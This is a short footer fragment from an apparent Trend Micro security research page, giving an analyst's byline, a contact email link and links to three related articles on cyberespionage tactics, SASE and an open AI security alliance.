  * Jonna Santos

Sr. Security Analyst




[ Contact Us ](mailto:tm_research@trendmicro.com)

### Related Articles

  * [ Unveiling Earth Kapre aka RedCurl’s Cyberespionage Tactics With Trend Micro MDR, Threat Intelligence ](/en/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html)
  * [ A Secure Access Service Edge (SASE) Guide for Leaders ](/en/research/22/h/secure-access-service-edge-sase-security-company.html)
  * [ Why the Open Secure AI Alliance Matters: Open Frontier Models, Open Deployment Flexibility ](/en/research/26/g/open-secure-ai-alliance.html)



[ See all articles ](/en/research.html)

[ ](/en/research.html)